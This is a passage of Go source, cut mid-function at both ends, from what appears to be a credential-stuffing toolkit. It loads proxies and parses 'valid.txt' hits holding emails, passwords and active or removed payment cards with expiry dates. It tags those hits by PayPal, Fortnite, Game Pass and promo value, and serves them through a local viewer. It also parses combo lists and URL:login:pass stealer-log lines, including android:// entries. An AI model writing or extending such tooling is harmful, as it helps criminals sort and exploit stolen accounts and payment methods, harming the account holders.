		if resolved := resolveLocalFile(p); resolved != "" {
			p = resolved
		}
		px, err = loadProxies(p)
	} else {
		px, err = fetchProxiesFromURLs(req.URLs)
	}
	if err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "count": len(px)})
}

func validTxtPath() string {
	if exe, err := os.Executable(); err == nil {
		p := filepath.Join(filepath.Dir(exe), "valid.txt")
		if fileExists(p) {
			return p
		}
	}
	if wd, err := os.Getwd(); err == nil {
		p := filepath.Join(wd, "valid.txt")
		if fileExists(p) {
			return p
		}
	}
	return "valid.txt"
}

type viewerAccount struct {
	ID       int               `json:"id"`
	Line     int               `json:"line"`
	Email    string            `json:"email"`
	Password string            `json:"password"`
	Raw      string            `json:"raw"`
	Fields   map[string]string `json:"fields"`
	Tags     []string          `json:"tags"`
}

var (
	viewerMu   sync.Mutex
	viewerAccs []viewerAccount
	viewerStat map[string]any
	viewerVer  int64
)

func loadValids() {
	path := validTxtPath()
	f, err := os.Open(path)
	list := []viewerAccount{}
	if err == nil {
		sc := bufio.NewScanner(f)
		buf := make([]byte, 0, 1024*1024)
		sc.Buffer(buf, 32*1024*1024)
		n := 0
		for sc.Scan() {
			raw := strings.TrimSpace(sc.Text())
			if raw == "" {
				continue
			}
			n++
			list = append(list, parseValidLine(n, raw))
		}
		f.Close()
	}
	info, _ := os.Stat(path)
	countries := map[string]int{}
	tags := map[string]int{}
	withPass := 0
	for _, a := range list {
		if a.Password != "" {
			withPass++
		}
		if c := strings.TrimSpace(a.Fields["Country"]); c != "" {
			countries[c]++
		}
		for _, t := range a.Tags {
			tags[t]++
		}
	}
	st := map[string]any{
		"total":      len(list),
		"with_pass":  withPass,
		"countries":  countries,
		"tag_counts": tags,
		"file_path":  path,
		"file_size":  int64(0),
		"modified":   "",
		"loaded_at":  time.Now().Format("2006-01-02 15:04:05"),
	}
	if info != nil {
		st["file_size"] = info.Size()
		st["modified"] = info.ModTime().Format("2006-01-02 15:04:05")
	}
	viewerMu.Lock()
	viewerVer++
	st["version"] = viewerVer
	viewerAccs = list
	viewerStat = st
	viewerMu.Unlock()
}

func viewerLabeledField(p string) bool {
	p = strings.TrimSpace(p)
	if j := strings.Index(p, ":"); j > 0 && j < 24 {
		k := strings.ToLower(strings.TrimSpace(p[:j]))
		switch k {
		case "active", "inactive", "country", "services", "keywords", "promos",
			"claimed promos", "fortnite", "specials", "inbox", "expires",
			"level", "account level", "v-bucks", "display", "notes", "account type":
			return true
		}
	}
	low := strings.ToLower(p)
	return strings.HasPrefix(low, "active:") || strings.HasPrefix(low, "inactive:") ||
		strings.HasPrefix(low, "country:") || strings.HasPrefix(low, "services:")
}

func parseValidLine(line int, raw string) viewerAccount {
	parts := strings.Split(raw, " | ")
	if len(parts) == 1 {
		parts = strings.Split(raw, "|")
	}
	acc := viewerAccount{ID: line, Line: line, Raw: raw, Fields: map[string]string{}}
	if len(parts) > 0 {
		acc.Email = strings.TrimSpace(parts[0])
	}
	start := 1
	if len(parts) > 1 && !viewerLabeledField(parts[1]) {
		acc.Password = strings.TrimSpace(parts[1])
		start = 2
	} else if i := strings.Index(acc.Email, ":"); i > 0 {
		acc.Password = strings.TrimSpace(acc.Email[i+1:])
		acc.Email = strings.TrimSpace(acc.Email[:i])
	}
	var activeCards, removedCards, expires []string
	for i := start; i < len(parts); i++ {
		p := strings.TrimSpace(parts[i])
		if p == "" {
			continue
		}
		low := strings.ToLower(p)
		if strings.HasPrefix(low, "keywords:") || (strings.Contains(low, "epicgames:") && strings.Contains(low, "netflix:")) {
			v := p
			if j := strings.Index(p, ":"); j >= 0 {
				v = strings.TrimSpace(p[j+1:])
			}
			v = strings.Trim(v, "[]")
			var hits []string
			for _, bit := range strings.Split(v, ",") {
				bit = strings.TrimSpace(bit)
				if bit == "" || strings.HasSuffix(bit, ":0") || strings.HasSuffix(bit, " 0") {
					continue
				}
				hits = append(hits, bit)
			}
			if len(hits) > 0 {
				acc.Fields["Keywords"] = strings.Join(hits, ", ")
			}
			continue
		}
		if isCardLine(p) {
			if isRemovedCard(p) {
				removedCards = append(removedCards, p)
			} else {
				activeCards = append(activeCards, p)
			}
			continue
		}
		key, val := "", p
		if j := strings.Index(p, ":"); j > 0 && j < 40 {
			cand := strings.TrimSpace(p[:j])
			if cand != "" && !strings.Contains(strings.ToLower(cand), "http") && strings.Count(cand, " ") <= 3 {
				key, val = cand, strings.TrimSpace(p[j+1:])
			}
		}
		if key == "" {
			if looksLikeExpires(p) {
				expires = append(expires, strings.TrimSpace(strings.TrimPrefix(p, "Expires:")))
			} else if prev := acc.Fields["Notes"]; prev != "" {
				acc.Fields["Notes"] = prev + " · " + p
			} else {
				acc.Fields["Notes"] = p
			}
			continue
		}
		lk := strings.ToLower(key)
		switch {
		case lk == "expires" || lk == "expiry" || lk == "exp":
			if val != "" {
				expires = append(expires, strings.Trim(val, "[]"))
			}
		case strings.Contains(lk, "removed") || lk == "inactive":
			for _, piece := range splitCardList(val) {
				piece = strings.TrimSpace(strings.Trim(piece, "[]"))
				if piece != "" {
					removedCards = append(removedCards, piece)
				}
			}
		case lk == "active" || lk == "card" || lk == "cards" || (strings.Contains(lk, "card") && !strings.Contains(lk, "discard")):
			clean := strings.Trim(val, "[]")
			if strings.EqualFold(strings.TrimSpace(clean), "No Active Payment Methods") {
				acc.Fields["Active"] = "No Active Payment Methods"
				continue
			}
			for _, piece := range splitCardList(clean) {
				piece = strings.TrimSpace(piece)
				if piece == "" {
					continue
				}
				if isRemovedCard(piece) {
					removedCards = append(removedCards, piece)
				} else if isCardLine(piece) {
					activeCards = append(activeCards, piece)
				} else if looksLikeExpires(piece) {
					expires = append(expires, piece)
				} else {
					activeCards = append(activeCards, piece)
				}
			}
		default:
			if prev, ok := acc.Fields[key]; ok && prev != "" {
				acc.Fields[key] = prev + " · " + val
			} else {
				acc.Fields[key] = val
			}
		}
	}
	if len(activeCards) > 0 {
		acc.Fields["Active Cards"] = joinWithExpires(activeCards, expires)
	}
	if len(removedCards) > 0 {
		acc.Fields["Removed Cards"] = joinWithExpires(removedCards, nil)
		if len(expires) > 0 && len(activeCards) == 0 {
			acc.Fields["Removed Cards"] = joinWithExpires(removedCards, expires)
		} else if len(expires) > len(activeCards) {
			extra := expires[len(activeCards):]
			if len(extra) > 0 {
				acc.Fields["Removed Cards"] = joinWithExpires(removedCards, extra)
			}
		}
	}
	delete(acc.Fields, "Expires")
	acc.Tags = deriveViewerTags(acc)
	return acc
}

func isCardLine(s string) bool {
	low := strings.ToLower(s)
	return strings.Contains(low, "visa") || strings.Contains(low, "mastercard") ||
		strings.Contains(low, "master card") || strings.Contains(low, "amex") ||
		strings.Contains(low, "american express") || strings.Contains(low, "discover") ||
		(strings.Contains(low, "card") && !strings.Contains(low, "discard")) ||
		(strings.Contains(low, "paypal") && (strings.Contains(low, "[") || strings.Contains(low, "removed") || strings.Contains(low, "active")))
}

func isRemovedCard(s string) bool {
	low := strings.ToLower(s)
	return strings.Contains(low, "[removed]") || strings.Contains(low, "(removed)") ||
		strings.Contains(low, " removed")
}

func splitCardList(val string) []string {
	if strings.Contains(val, " · ") {
		return strings.Split(val, " · ")
	}
	if strings.Contains(val, ";") {
		return strings.Split(val, ";")
	}
	return []string{val}
}

func looksLikeExpires(s string) bool {
	low := strings.ToLower(strings.TrimSpace(s))
	if strings.HasPrefix(low, "expires") {
		return true
	}
	parts := strings.Split(s, "·")
	ok := 0
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if len(p) >= 3 && len(p) <= 8 && strings.Contains(p, "/") {
			ok++
		}
	}
	return ok > 0 && ok >= len(parts)/2
}

func joinWithExpires(cards []string, expires []string) string {
	var out []string
	for i, c := range cards {
		if i < len(expires) && strings.TrimSpace(expires[i]) != "" {
			out = append(out, fmt.Sprintf("%s (exp %s)", c, strings.TrimSpace(expires[i])))
		} else {
			out = append(out, c)
		}
	}
	return strings.Join(out, " · ")
}

func deriveViewerTags(a viewerAccount) []string {
	var tags []string
	add := func(t string) {
		for _, x := range tags {
			if x == t {
				return
			}
		}
		tags = append(tags, t)
	}
	raw := strings.ToLower(a.Raw)
	svc := strings.ToLower(a.Fields["Services"])
	fn := strings.ToLower(a.Fields["Fortnite"])
	pr := strings.ToLower(a.Fields["Promos"])
	cl := strings.ToLower(a.Fields["Claimed Promos"])
	act := strings.ToLower(a.Fields["Active"])
	sp := strings.ToLower(a.Fields["Specials"])
	fnBlob := fn
	if fnBlob == "" && strings.Contains(raw, "fortnite") {
		fnBlob = raw
	}
	if fnBlob != "" {
		neg := strings.Contains(fnBlob, "no account") || strings.Contains(fnBlob, "not linked") ||
			strings.Contains(fnBlob, "login required") || strings.Contains(fnBlob, "consent needed") ||
			strings.Contains(fnBlob, "check failed")
		pos := strings.Contains(fnBlob, "skin") || strings.Contains(fnBlob, "specials") ||
			strings.Contains(fnBlob, "vbuck") || strings.Contains(fnBlob, "level") ||
			strings.Contains(fnBlob, "locker") || strings.Contains(fnBlob, "wins") ||
			(sp != "" && sp != "-" && sp != "none")
		if pos && !neg {
			add("Fortnite")
		}
	}
	at := strings.ToLower(a.Fields["Account Type"])
	if at == "" && strings.Contains(raw, "account type:") {
		at = raw
	}
	if strings.Contains(at, "private") {
		add("Private")
	}
	if strings.Contains(at, "free") {
		add("Free")
	}
	if strings.Contains(svc, "ultimate") || strings.Contains(raw, "game pass ultimate") {
		add("Ultimate")
	}
	if strings.Contains(svc, "pc game pass") {
		add("PC Game Pass")
	}
	if strings.Contains(svc, "essential") {
		add("Essential")
	}
	if strings.Contains(svc, "starter") {
		add("Starter")
	}
	if strings.Contains(svc, "365") {
		add("Microsoft 365")
	}
	if pr != "" && pr != "-" && !strings.Contains(pr, "no promo") {
		add("Promos")
		if strings.Contains(pr, "discord") {
			add("Discord Promo")
		}
	}
	if cl != "" && cl != "-" {
		add("Claimed Promos")
		if strings.Contains(cl, "discord") {
			add("Claimed Discord")
		}
	}
	if viewerPayPalMatches(a) {
		add("PayPal")
	}
	payBlob := act
	if v := strings.ToLower(a.Fields["Removed Cards"]); v != "" {
		payBlob += " " + v
	}
	if strings.Contains(payBlob, "card") || strings.Contains(payBlob, "visa") || strings.Contains(payBlob, "master") ||
		strings.Contains(payBlob, "amex") || strings.Contains(payBlob, "discover") || strings.Contains(payBlob, "paypal") {
		if !strings.Contains(act, "no active payment") || strings.Contains(payBlob, "card") || strings.Contains(payBlob, "paypal") {
			add("Has Payment")
		}
	}
	if strings.Contains(act, "no active payment") && !strings.Contains(payBlob, "visa") && !strings.Contains(payBlob, "card") {
		add("No Payment")
	}
	return tags
}

func viewerPayPalMatches(a viewerAccount) bool {
	email := strings.ToLower(strings.TrimSpace(a.Email))
	if email == "" {
		return false
	}
	var blobs []string
	for k, v := range a.Fields {
		lk := strings.ToLower(k)
		lv := strings.ToLower(v)
		if strings.Contains(lk, "paypal") || strings.Contains(lv, "paypal") ||
			strings.Contains(lk, "active cards") || strings.Contains(lk, "removed cards") ||
			strings.EqualFold(k, "Active") {
			blobs = append(blobs, v)
		}
	}
	if len(blobs) == 0 {
		blobs = append(blobs, a.Raw)
	}
	for _, blob := range blobs {
		for _, payEmail := range extractPayPalEmails(blob) {
			if payEmail == email {
				return true
			}
		}
	}
	return false
}

func extractPayPalEmails(blob string) []string {
	low := strings.ToLower(blob)
	if !strings.Contains(low, "paypal") {
		return nil
	}
	var out []string
	segments := strings.FieldsFunc(blob, func(r rune) bool {
		return r == '|' || r == ';' || r == '\n'
	})
	if len(segments) == 1 {
		segments = strings.Split(blob, " · ")
	}
	for _, seg := range segments {
		segLow := strings.ToLower(seg)
		if !strings.Contains(segLow, "paypal") {
			continue
		}
		for _, token := range strings.FieldsFunc(segLow, func(r rune) bool {
			return r == ' ' || r == ',' || r == '(' || r == ')' || r == '[' || r == ']' || r == ':' || r == '<' || r == '>'
		}) {
			token = strings.Trim(token, ".:\"'")
			if strings.Count(token, "@") == 1 && strings.Contains(token, ".") && !strings.HasPrefix(token, "@") {
				out = append(out, token)
			}
		}
	}
	return out
}

func viewerAccountMatches(a viewerAccount, terms []string) bool {
	var b strings.Builder
	b.WriteString(strings.ToLower(a.Email))
	b.WriteByte(' ')
	b.WriteString(strings.ToLower(a.Password))
	b.WriteByte(' ')
	for _, t := range a.Tags {
		b.WriteString(strings.ToLower(t))
		b.WriteByte(' ')
	}
	for k, v := range a.Fields {
		b.WriteString(strings.ToLower(k))
		b.WriteByte(' ')
		b.WriteString(strings.ToLower(v))
		b.WriteByte(' ')
	}
	hay := b.String()
	for _, term := range terms {
		if term == "" {
			continue
		}
		if !strings.Contains(hay, term) {
			return false
		}
	}
	return true
}

func handleViewerAccounts(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	viewerMu.Lock()
	if len(viewerAccs) == 0 {
		viewerMu.Unlock()
		loadValids()
		viewerMu.Lock()
	}
	q := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("q")))
	tag := r.URL.Query().Get("tag")
	country := r.URL.Query().Get("country")
	sortKey := r.URL.Query().Get("sort")
	page := 1
	limit := 24
	fmt.Sscanf(r.URL.Query().Get("page"), "%d", &page)
	fmt.Sscanf(r.URL.Query().Get("limit"), "%d", &limit)
	if page < 1 {
		page = 1
	}
	if limit <= 0 || limit > 60 {
		limit = 24
	}
	out := make([]viewerAccount, 0, len(viewerAccs))
	terms := strings.Fields(q)
	for _, a := range viewerAccs {
		if len(terms) > 0 && !viewerAccountMatches(a, terms) {
			continue
		}
		if country != "" && a.Fields["Country"] != country {
			continue
		}
		if tag != "" {
			ok := false
			for _, t := range a.Tags {
				if strings.EqualFold(t, tag) {
					ok = true
					break
				}
			}
			if !ok {
				continue
			}
		}
		out = append(out, a)
	}
	viewerMu.Unlock()
	switch sortKey {
	case "email":
		sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i].Email) < strings.ToLower(out[j].Email) })
	case "email-desc":
		sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i].Email) > strings.ToLower(out[j].Email) })
	case "country":
		sort.Slice(out, func(i, j int) bool { return out[i].Fields["Country"] < out[j].Fields["Country"] })
	case "line", "oldest":
		sort.Slice(out, func(i, j int) bool { return out[i].Line < out[j].Line })
	case "newest":
		sort.Slice(out, func(i, j int) bool { return out[i].Line > out[j].Line })
	}
	total := len(out)
	pages := 1
	if total > 0 {
		pages = (total + limit - 1) / limit
	}
	if page > pages {
		page = pages
	}
	start := (page - 1) * limit
	if start < 0 {
		start = 0
	}
	end := start + limit
	if end > total {
		end = total
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"accounts": out[start:end], "count": total, "page": page, "pages": pages, "limit": limit})
}

func handleViewerStats(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	viewerMu.Lock()
	if viewerStat == nil {
		viewerMu.Unlock()
		loadValids()
		viewerMu.Lock()
	}
	st := viewerStat
	viewerMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(st)
}

func handleViewerReload(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	loadValids()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true})
}

func handleViewerEvents(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fl, ok := w.(stdhttp.Flusher)
	if !ok {
		return
	}
	path := validTxtPath()
	var last time.Time
	if info, err := os.Stat(path); err == nil {
		last = info.ModTime()
	}
	ticker := time.NewTicker(8 * time.Second)
	defer ticker.Stop()
	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			info, err := os.Stat(path)
			if err != nil {
				continue
			}
			if info.ModTime().After(last) {
				last = info.ModTime()
				_, _ = io.WriteString(w, "data: update\n\n")
				fl.Flush()
			}
		}
	}
}

func handleValidList(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	path := validTxtPath()
	type row struct {
		Line     int               `json:"line"`
		Email    string            `json:"email"`
		Password string            `json:"password"`
		Raw      string            `json:"raw"`
		Fields   map[string]string `json:"fields"`
	}
	var out []row
	f, err := os.Open(path)
	if err == nil {
		sc := bufio.NewScanner(f)
		buf := make([]byte, 0, 1024*1024)
		sc.Buffer(buf, 32*1024*1024)
		n := 0
		for sc.Scan() {
			raw := strings.TrimSpace(sc.Text())
			if raw == "" {
				continue
			}
			n++
			parts := strings.Split(raw, "|")
			email, pass := "", ""
			fields := map[string]string{}
			if len(parts) > 0 {
				ep := strings.SplitN(strings.TrimSpace(parts[0]), ":", 2)
				email = strings.TrimSpace(ep[0])
				if len(ep) > 1 {
					pass = strings.TrimSpace(ep[1])
				}
			}
			for i := 1; i < len(parts); i++ {
				p := strings.TrimSpace(parts[i])
				if p == "" {
					continue
				}
				k, v := p, ""
				if j := strings.Index(p, ":"); j > 0 {
					k = strings.TrimSpace(p[:j])
					v = strings.TrimSpace(p[j+1:])
				}
				if prev, ok := fields[k]; ok && prev != "" {
					fields[k] = prev + " · " + v
				} else {
					fields[k] = v
				}
			}
			out = append(out, row{Line: n, Email: email, Password: pass, Raw: raw, Fields: fields})
		}
		f.Close()
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"path": path, "total": len(out), "accounts": out})
}

func handleOpenViewer(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	u := "http://127.0.0.1:2719/"
	exe, err := os.Executable()
	if err != nil {
		exe = os.Args[0]
	}
	cmd := exec.Command(exe, "--viewer")
	cmd.Dir, _ = os.Getwd()
	err = cmd.Start()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": err == nil, "url": u})
}

func handleOpenLink(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	u := strings.TrimSpace(r.URL.Query().Get("u"))
	if !strings.HasPrefix(u, "https://t.me/") && !strings.HasPrefix(u, "https://telegram.me/") {
		stdhttp.Error(w, "blocked", 400)
		return
	}
	openBrowser(u)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true})
}

func editorStore() string {
	dir := filepath.Join(sessionsDir, "signatures")
	_ = os.MkdirAll(dir, 0755)
	return filepath.Join(dir, "index.json")
}

type editorBanner struct {
	Name string `json:"name"`
	Text string `json:"text"`
}

func loadEditorBanners() []editorBanner {
	b, err := os.ReadFile(editorStore())
	if err != nil {
		return nil
	}
	var list []editorBanner
	_ = json.Unmarshal(b, &list)
	return list
}

func saveEditorBanners(list []editorBanner) {
	b, _ := json.MarshalIndent(list, "", "  ")
	_ = os.WriteFile(editorStore(), b, 0644)
}

type kvCount struct {
	Name  string `json:"name"`
	Count int    `json:"count"`
}

func sortCounts(m map[string]int) []kvCount {
	return sortCountsN(m, 40)
}

func sortCountsN(m map[string]int, n int) []kvCount {
	out := make([]kvCount, 0, len(m))
	for k, v := range m {
		out = append(out, kvCount{k, v})
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Count == out[j].Count {
			return out[i].Name < out[j].Name
		}
		return out[i].Count > out[j].Count
	})
	if n <= 0 {
		n = 40
	}
	if len(out) > n {
		out = out[:n]
	}
	return out
}

func editorTextFromReq(r *stdhttp.Request) (string, string, error) {
	var req struct {
		Path string `json:"path"`
		Text string `json:"text"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		return "", "", err
	}
	if strings.TrimSpace(req.Text) != "" {
		return req.Text, req.Path, nil
	}
	p := resolveLocalFile(strings.TrimSpace(req.Path))
	if p == "" || !fileExists(p) {
		return "", req.Path, fmt.Errorf("file not found")
	}
	b, err := os.ReadFile(p)
	if err != nil {
		return "", p, err
	}
	if len(b) > 20<<20 {
		b = b[:20<<20]
	}
	return string(b), p, nil
}

func validEmailDomain(d string) string {
	d = strings.ToLower(strings.Trim(strings.TrimSpace(d), "."))
	if d == "" || strings.ContainsAny(d, "/\\?#@ ") || !strings.Contains(d, ".") {
		return ""
	}
	parts := strings.Split(d, ".")
	if len(parts) < 2 {
		return ""
	}
	tld := parts[len(parts)-1]
	if len(tld) < 2 || len(tld) > 14 {
		return ""
	}
	for _, r := range tld {
		if r < 'a' || r > 'z' {
			return ""
		}
	}
	if len(parts) >= 3 && (parts[0] == "com" || parts[0] == "org" || parts[0] == "net") {
		return ""
	}
	return d
}

func peekEmailHost(ln []byte) (edom, host string) {
	at := bytes.IndexByte(ln, '@')
	if at > 0 {
		end := at + 1
		for end < len(ln) {
			c := ln[end]
			if c == ':' || c == '|' || c == ';' || c == ' ' || c == '\t' || c == ',' {
				break
			}
			end++
		}
		if end > at+3 {
			edom = validEmailDomain(strings.ToLower(string(ln[at+1 : end])))
		}
	}
	col := bytes.IndexByte(ln, ':')
	if col > 2 && bytes.IndexByte(ln[:col], '@') < 0 && bytes.IndexByte(ln[:col], '.') > 0 {
		h := strings.ToLower(string(ln[:col]))
		h = strings.TrimPrefix(h, "https://")
		h = strings.TrimPrefix(h, "http://")
		h = strings.TrimPrefix(h, "www.")
		if i := strings.IndexAny(h, "/?#"); i >= 0 {
			h = h[:i]
		}
		host = h
	}
	return
}

func firstToken(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexAny(s, "|;,\t"); i >= 0 {
		return strings.TrimSpace(s[:i])
	}
	return s
}

func cleanHost(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "https://")
	s = strings.TrimPrefix(s, "http://")
	s = strings.TrimPrefix(s, "android://")
	if i := strings.Index(s, "://"); i >= 0 {
		s = s[i+3:]
	}
	if i := strings.IndexAny(s, "/?#"); i >= 0 {
		s = s[:i]
	}
	if i := strings.Index(s, ":"); i > 0 {
		port := s[i+1:]
		if port != "" && strings.Trim(port, "0123456789") == "" {
			s = s[:i]
		}
	}
	return strings.ToLower(strings.TrimPrefix(s, "www."))
}

func looksLikeEmail(s string) bool {
	s = strings.TrimSpace(s)
	i := strings.Index(s, "@")
	if i <= 0 || i >= len(s)-3 {
		return false
	}
	return strings.Contains(s[i+1:], ".") && !strings.ContainsAny(s, " /\\")
}

func looksLikeHost(s string) bool {
	s = strings.ToLower(strings.TrimSpace(s))
	s = strings.TrimPrefix(s, "www.")
	return s != "" && strings.Contains(s, ".") && !strings.Contains(s, " ")
}

func splitBySeps(s string) []string {
	for _, sep := range []string{" | ", "|", ";", "\t", ",", " "} {
		if strings.Contains(s, sep) {
			return strings.Split(s, sep)
		}
	}
	return []string{s}
}

func pickUserPass(parts []string) (user, pass, host, kind string) {
	clean := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(strings.Trim(p, "\"'"))
		if p != "" {
			clean = append(clean, p)
		}
	}
	if len(clean) == 0 {
		return "", "", "", "raw"
	}
	for i, p := range clean {
		if looksLikeEmail(p) && i+1 < len(clean) && !looksLikeHost(clean[i+1]) && !looksLikeEmail(clean[i+1]) {
			h := ""
			for _, q := range clean {
				if looksLikeHost(q) && !looksLikeEmail(q) {
					h = cleanHost(q)
					break
				}
			}
			k := "combo"
			if h != "" {
				k = "ulp"
			}
			return p, clean[i+1], h, k
		}
	}
	if len(clean) >= 3 {
		if strings.Contains(clean[0], "://") || looksLikeHost(clean[0]) {
			return clean[len(clean)-2], clean[len(clean)-1], cleanHost(clean[0]), "ulp"
		}
		if strings.Contains(clean[len(clean)-1], "://") || looksLikeHost(clean[len(clean)-1]) {
			return clean[0], clean[1], cleanHost(clean[len(clean)-1]), "ulp"
		}
	}
	if len(clean) >= 2 {
		return clean[0], clean[1], "", "combo"
	}
	return clean[0], "", "", "raw"
}

func parseComboFast(s string) (email, pass, host, kind string, ok bool) {
	at := strings.IndexByte(s, '@')
	if at <= 0 {
		return "", "", "", "", false
	}
	// email starts after last sep before @
	start := 0
	for i := at - 1; i >= 0; i-- {
		c := s[i]
		if c == ':' || c == '|' || c == ';' || c == '\t' || c == ' ' || c == '/' {
			start = i + 1
			break
		}
	}
	end := len(s)
	for i := at + 1; i < len(s); i++ {
		c := s[i]
		if c == ':' || c == '|' || c == ';' || c == '\t' || c == ' ' {
			end = i
			break
		}
	}
	email = s[start:end]
	if !strings.Contains(email[at-start+1:], ".") {
		return "", "", "", "", false
	}
	rest := ""
	if end < len(s) {
		rest = firstToken(s[end+1:])
	}
	if rest == "" {
		return "", "", "", "", false
	}
	host = ""
	if i := strings.Index(s, "://"); i >= 0 {
		host = cleanHost(s)
		kind = "ulp"
	} else if start > 0 {
		host = cleanHost(s[:start-1])
		if host != "" {
			kind = "ulp"
		} else {
			kind = "combo"
		}
	} else {
		kind = "combo"
	}
	return email, rest, host, kind, true
}

func parseComboLine(raw string) (email, pass, url, kind string) {
	s := strings.TrimSpace(raw)
	if s == "" || s[0] == '#' || (len(s) > 1 && s[0] == '/' && (s[1] == '/' || s[1] == '*')) {
		return "", "", "", "skip"
	}
	if strings.HasPrefix(s, "\ufeff") {
		s = strings.TrimPrefix(s, "\ufeff")
	}
	if e, p, h, k, ok := parseComboFast(s); ok {
		return e, p, h, k
	}
	// JSON / key dumps
	if strings.HasPrefix(s, "{") && strings.Contains(s, "\"pass") {
		var obj map[string]interface{}
		if json.Unmarshal([]byte(s), &obj) == nil {
			get := func(keys ...string) string {
				for _, k := range keys {
					if v, ok := obj[k]; ok {
						if t, ok := v.(string); ok {
							return strings.TrimSpace(t)
						}
					}
				}
				return ""
			}
			e := get("email", "user", "username", "login", "account", "mail")
			p := get("password", "pass", "passwd", "pwd")
			u := get("url", "host", "site", "domain", "website")
			if e != "" && p != "" {
				k := "combo"
				if u != "" {
					k = "ulp"
				}
				return e, p, cleanHost(u), k
			}
		}
	}
	low := strings.ToLower(s)
	// user:pass@host
	if at := strings.Index(s, "://"); at >= 0 {
		rest := s[at+3:]
		if uAt := strings.Index(rest, "@"); uAt > 0 && strings.Contains(rest[:uAt], ":") {
			up := strings.SplitN(rest[:uAt], ":", 2)
			return strings.TrimSpace(up[0]), strings.TrimSpace(up[1]), cleanHost(rest[uAt+1:]), "ulp"
		}
	}
	// android://hash@host
	if strings.HasPrefix(low, "android://") {
		if at := strings.LastIndex(s, "@"); at > 0 {
			host := cleanHost(s[at+1:])
			left := s[:at]
			// often android://HASH@host plus :user:pass after host path
			if i := strings.Index(s[at+1:], ":"); i >= 0 {
				tail := s[at+1+i+1:]
				parts := splitBySeps(strings.ReplaceAll(tail, ":", "|"))
				e, p, _, _ := pickUserPass(parts)
				if e != "" && p != "" {
					return e, p, host, "ulp"
				}
			}
			_ = left
			return "", "", host, "ulp"
		}
	}
	// Prefer explicit multi-separators
	if strings.Contains(s, "|") || strings.Contains(s, ";") || strings.Contains(s, "\t") {
		e, p, h, k := pickUserPass(splitBySeps(s))
		return e, p, h, k
	}
	if strings.Contains(s, ",") && looksLikeEmail(strings.Split(s, ",")[0]) {
		e, p, h, k := pickUserPass(strings.Split(s, ","))
		return e, p, h, k
	}
	// Colon ULP / combo. Handle email:pass and url:email:pass and email:pass:url
	if strings.Contains(s, ":") {
		// Don't split the scheme
		work := s
		scheme := ""
		if i := strings.Index(work, "://"); i >= 0 {
			scheme = work[:i+3]
			work = work[i+3:]
		}
		parts := strings.Split(work, ":")
		if scheme != "" {
			parts[0] = scheme + parts[0]
		}
		// Collapse empty from email::pass
		e, p, h, k := pickUserPass(parts)
		if e != "" && p != "" {
			return e, p, h, k
		}
	}
	if strings.Contains(s, " ") {
		e, p, h, k := pickUserPass(strings.Fields(s))
		if e != "" && p != "" {
			return e, p, h, k
		}
	}
	return s, "", "", "raw"
}

func emailDomain(email string) string {
	i := strings.LastIndex(email, "@")
	if i < 0 || i == len(email)-1 {
		return ""
	}
	return validEmailDomain(strings.ToLower(strings.TrimSpace(email[i+1:])))
}

func comboUserPass(ln string) (email, pass string) {
	if e, p, _, _, ok := parseComboFast(ln); ok && e != "" && p != "" {
		if i := strings.IndexAny(p, " \t"); i > 0 {
			p = p[:i]
		}
		return e, p
	}
	return fastUserPass(ln)
}

func fastUserPass(ln string) (email, pass string) {
	email = reEditorEmail.FindString(ln)
	if email == "" {
		return "", ""
	}
	i := strings.Index(ln, email)
	rest := ""
	if i >= 0 {
		rest = ln[i+len(email):]
	}
	rest = strings.TrimLeft(rest, " :|;,\t")
	if rest == "" && i > 0 {
		prev := strings.TrimRight(ln[:i], " :|;,\t")
		if j := strings.LastIndexAny(prev, ":|;,\t "); j >= 0 {
			rest = strings.TrimSpace(prev[j+1:])
		}
	}
	if rest == "" {
		return email, ""
	}
	if j := strings.IndexAny(rest, "|;\t ,"); j >= 0 {
		rest = rest[:j]
	}
	if j := strings.Index(rest, "://"); j >= 0 {
		rest = strings.TrimSpace(rest[:j])
	}
	return email, strings.TrimSpace(rest)
}

func editorScanner(r io.Reader) *bufio.Scanner {
	sc := bufio.NewScanner(r)
	buf := make([]byte, 1024*1024)
	sc.Buffer(buf, 8*1024*1024)
	return sc
}

func previewEditorFile(path string, n int) (string, int64, error) {
	p := resolveLocalFile(strings.TrimSpace(path))
	if p == "" {
		return "", 0, fmt.Errorf("no file")
	}
	f, err := os.Open(p)
	if err != nil {
		return "", 0, err
	}
	defer f.Close()
	st, _ := f.Stat()
	var size int64
	if st != nil {
		size = st.Size()
	}
	if n <= 0 {
		n = 80
	}
	sc := editorScanner(f)
	var b strings.Builder
	i := 0
	for sc.Scan() && i < n {
		if i > 0 {
			b.WriteByte('\n')
		}
		b.WriteString(sc.Text())
		i++
	}
	return b.String(), size, sc.Err()
}

func handleEditorAnalyzeStream(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	path := r.URL.Query().Get("path")
